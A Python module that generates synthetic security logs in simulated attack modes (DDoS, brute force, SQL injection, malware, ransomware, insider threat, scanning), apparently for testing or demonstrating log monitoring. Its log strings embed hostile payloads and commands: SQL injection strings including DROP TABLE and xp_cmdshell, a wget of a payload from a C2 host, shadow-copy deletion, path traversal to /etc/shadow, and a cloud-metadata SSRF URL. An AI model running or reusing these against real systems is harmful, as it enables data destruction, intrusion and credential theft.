"""
log_simulator.py — ILF Log Simulation Engine
8 simulation modes: random, ddos, brute_force, sql_injection,
malware, insider_threat, ransomware, normal.
Each mode generates realistic, distinct log patterns.
"""
import random, uuid, datetime

# ── Shared helpers ───────────────────────────────
def _ts():
    return datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'

def _ip(internal=False):
    if internal: return f'10.{random.randint(0,10)}.{random.randint(1,50)}.{random.randint(2,254)}'
    return f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'

def _id(): return str(uuid.uuid4())[:8]

SOURCES = ['nginx', 'apache2', 'syslog', 'auth', 'kernel', 'iptables', 'fail2ban',
           'application', 'mysql', 'postgresql', 'redis', 'ssh', 'vpn']
USERS   = ['root', 'admin', 'www-data', 'ubuntu', 'deploy', 'postgres', 'redis',
           'oracle', 'backup', 'service', 'monitor']

# ── Mode: NORMAL ─────────────────────────────────
def _normal():
    msgs = [
        ('INFO',  'nginx',  f'GET /api/v2/logs HTTP/1.1 200 {random.randint(12,240)}ms {_ip()}'),
        ('INFO',  'nginx',  f'POST /api/auth/login HTTP/1.1 200 {random.randint(40,180)}ms {_ip()}'),
        ('DEBUG', 'app',    f'DB query completed in {random.randint(2,18)}ms rows={random.randint(1,500)}'),
        ('INFO',  'syslog', f'Cron job /etc/cron.d/backup completed exit=0 duration={random.randint(1,30)}s'),
        ('INFO',  'nginx',  f'GET /health HTTP/1.1 200 1ms {_ip(True)}'),
        ('DEBUG', 'redis',  f'PING latency={random.randint(1,3)}ms clients={random.randint(2,20)}'),
    ]
    return random.choice(msgs)

# ── Mode: DDoS ────────────────────────────────────
def _ddos():
    attacker_pool = [_ip() for _ in range(6)]
    ip   = random.choice(attacker_pool)
    reqs = random.randint(800, 5000)
    msgs = [
        ('CRITICAL','iptables', f'FLOOD DETECTED src={ip} dst=192.168.1.10 proto=TCP SYN rate={reqs}/s DROP'),
        ('ERROR',   'nginx',    f'rate limit exceeded: {ip} — {reqs} requests/s on /api — 429 returned'),
        ('CRITICAL','nginx',    f'upstream overload: worker_connections {random.randint(900,1024)}/1024 active'),
        ('WARN',    'kernel',   f'net: too many open files fd={random.randint(60000,65535)} limit=65535'),
        ('ERROR',   'nginx',    f'no live upstreams while connecting to upstream src={ip} 503'),
        ('CRITICAL','iptables', f'CONNECTION FLOOD {ip} half-open={random.randint(500,2000)} SYN_RECV'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: BRUTE FORCE ────────────────────────────
def _brute_force():
    ip   = _ip()
    user = random.choice(USERS)
    attempt = random.randint(1, 500)
    msgs = [
        ('ERROR',    'auth',    f'pam_unix(sshd:auth): authentication failure; user={user} rhost={ip}'),
        ('WARN',     'fail2ban',f'[sshd] Ban {ip} — {attempt} failures in 60s exceeded maxretry=5'),
        ('CRITICAL', 'ssh',     f'Illegal user {user} from {ip} port {random.randint(10000,65535)}'),
        ('ERROR',    'sshd',    f'Failed password for invalid user {user} from {ip} port {random.randint(10000,65535)} ssh2'),
        ('WARN',     'auth',    f'POSSIBLE BREAK-IN ATTEMPT! reverse mapping checked getaddrinfo for {ip}'),
        ('CRITICAL', 'auth',    f'max auth attempts ({attempt}) exceeded for invalid user {user} from {ip}'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: SQL INJECTION ──────────────────────────
def _sql_injection():
    ip      = _ip()
    payloads = [
        "' OR '1'='1", "'; DROP TABLE users;--", "1 UNION SELECT * FROM users--",
        "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--",
        "admin'--", "1; EXEC xp_cmdshell('whoami')--",
    ]
    endpoints = ['/api/login', '/search', '/api/users', '/report', '/admin/query']
    pl = random.choice(payloads)
    ep = random.choice(endpoints)
    msgs = [
        ('CRITICAL','waf',        f'SQLi detected src={ip} endpoint={ep} payload={repr(pl)} BLOCKED'),
        ('ERROR',   'application',f'DB error: syntax error near \'{pl}\' from IP {ip} {ep}'),
        ('WARN',    'nginx',      f'suspicious request {ip} GET {ep}?id={pl} 400'),
        ('CRITICAL','mysql',      f'Access denied for injection attempt user=\'{random.choice(USERS)}\' src={ip}'),
        ('ERROR',   'application',f'Exception: unterminated quoted string at {ep} params={repr(pl)} from {ip}'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: MALWARE ────────────────────────────────
def _malware():
    ip      = _ip()
    c2_ip   = _ip()
    domains = ['evil.xyz', 'malware-c2.ru', 'botnet.io', 'ransom-pay.onion.to']
    c2_dom  = random.choice(domains)
    files   = ['/tmp/.hidden_exec', '/usr/lib/.libssl.so.bak', '/var/tmp/update.sh', '/dev/shm/.x86']
    msgs = [
        ('CRITICAL','kernel',     f'process /bin/bash spawned child with suspicious args: wget {c2_ip}/payload.sh'),
        ('CRITICAL','iptables',   f'OUTBOUND C2 TRAFFIC blocked: src=192.168.1.50 dst={c2_ip} port=4444 ESTABLISHED'),
        ('ERROR',   'clamav',     f'FOUND Trojan.GenericKD.123456 in {random.choice(files)} — quarantined'),
        ('CRITICAL','syslog',     f'Unexpected crontab modification by {random.choice(USERS)}: * * * * * /tmp/.x'),
        ('WARN',    'application',f'DNS query for known malware domain {c2_dom} from internal host {_ip(True)}'),
        ('CRITICAL','kernel',     f'ptrace syscall anomaly: PID {random.randint(1000,9999)} tracing PID {random.randint(1,999)}'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: INSIDER THREAT ─────────────────────────
def _insider_threat():
    user  = random.choice(USERS)
    ip    = _ip(True)
    bytes_= random.randint(500, 9000)
    msgs = [
        ('WARN',    'auth',       f'user {user} logged in outside business hours 02:{random.randint(10,59):02d} UTC from {ip}'),
        ('ERROR',   'application',f'bulk export: {user} downloaded {bytes_} records from /api/data/export at {ip}'),
        ('CRITICAL','syslog',     f'privilege escalation: {user} executed sudo -i from {ip} — unexpected'),
        ('WARN',    'application',f'{user} accessed {random.randint(40,200)} restricted records in 5 min from {ip}'),
        ('CRITICAL','syslog',     f'{user} scp large file ({bytes_}MB) to external {_ip()} — policy violation'),
        ('ERROR',   'auth',       f'{user} added SSH key from unknown device {ip} — security alert'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: RANSOMWARE ─────────────────────────────
def _ransomware():
    ip  = _ip()
    ext = random.choice(['.locked', '.encrypted', '.cerber', '.locky', '.wncry'])
    dirs= ['/var/www', '/home', '/opt/data', '/srv', '/etc/app']
    msgs = [
        ('CRITICAL','kernel',     f'inotify: mass file rename to *{ext} in {random.choice(dirs)} — {random.randint(100,2000)} files/s'),
        ('CRITICAL','syslog',     f'vssadmin delete shadows /all /quiet executed by {random.choice(USERS)} — RANSOMWARE INDICATOR'),
        ('CRITICAL','iptables',   f'RANSOM C2: outbound connection {ip}:443 detected — pattern matches known ransomware'),
        ('ERROR',   'application',f'cannot open {random.choice(dirs)}/config.db: file magic bytes corrupted (encrypted)'),
        ('CRITICAL','syslog',     f'bcdedit /set {"{bootstatuspolicy}"} ignoreallfailures — recovery disabled by PID {random.randint(1000,9999)}'),
        ('CRITICAL','kernel',     f'AV engine halted: process {random.randint(1000,9999)} killed antivirus service avd.service'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode: HACKING / APT ──────────────────────────
def _hacking():
    ip = _ip()
    msgs = [
        ('CRITICAL','syslog',     f'nmap scan from {ip}: SYN scan on 65535 ports in 12s detected'),
        ('ERROR',   'apache2',    f'Directory traversal: GET /../../../etc/passwd HTTP/1.1 403 from {ip}'),
        ('CRITICAL','auth',       f'SSH public key replaced for root from unrecognised IP {ip} at 03:{random.randint(0,59):02d}'),
        ('WARN',    'application',f'LFI attempt: /api/render?file=../../../../etc/shadow from {ip}'),
        ('CRITICAL','iptables',   f'Port scan: {ip} probed {random.randint(400,1000)} ports in {random.randint(2,8)}s'),
        ('ERROR',   'nginx',      f'SSRF attempt: URL=http://169.254.169.254/metadata from {ip}'),
        ('CRITICAL','kernel',     f'kernel exploit attempt: CVE-2021-4034 polkit pkexec anomaly PID={random.randint(1000,9999)} src={ip}'),
    ]
    sev, src, msg = random.choice(msgs)
    return sev, src, msg

# ── Mode dispatcher ───────────────────────────────
MODES = {
    'random':         lambda: random.choice([_ddos, _brute_force, _sql_injection, _malware,
                                              _ransomware, _hacking, _insider_threat, _normal])(),
    'normal':         _normal,
    'ddos':           _ddos,
    'brute_force':    _brute_force,
    'sql_injection':  _sql_injection,
    'malware':        _malware,
    'insider_threat': _insider_threat,
    'ransomware':     _ransomware,
    'hacking':        _hacking,
}

def generate_logs(count: int = 10, mode: str = 'random',
                  source_filter: str = 'all', severity_filter: str = 'all') -> list[dict]:
    """
    Generate `count` log entries using the specified simulation mode.
    Applies optional source/severity filtering.
    """
    logs = []
    fn   = MODES.get(mode, MODES['random'])

    for _ in range(count * 3):          # over-generate then filter
        result = fn()
        if len(result) == 2:
            sev, src = result; msg = sev  # fallback
        else:
            sev, src, msg = result

        if source_filter != 'all' and src != source_filter:
            continue
        if severity_filter != 'all' and sev != severity_filter:
            continue

        logs.append({
            'id':        _id(),
            'timestamp': _ts(),
            'severity':  sev,
            'source':    src,
            'message':   msg,
            'ip':        _ip(),
            'pid':       random.randint(100, 65535),
            'mode':      mode,
        })
        if len(logs) >= count:
            break

    return logs or [{'id':_id(),'timestamp':_ts(),'severity':'INFO','source':'system',
                     'message':'No matching logs for filter.','ip':'0.0.0.0','pid':0,'mode':mode}]
